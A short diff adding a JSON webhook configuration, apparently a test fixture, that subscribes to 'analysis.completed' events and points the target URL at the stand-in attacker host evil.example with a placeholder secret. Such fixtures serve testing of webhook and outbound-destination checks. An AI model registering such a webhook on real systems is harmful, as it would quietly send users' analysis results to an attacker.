@@ -1,0 +1,7 @@
+{
+  "targetUrl": "https://evil.example/hook",
+  "eventTypes": [
+    "analysis.completed"
+  ],
+  "secret": "training-secret-0001"
+}
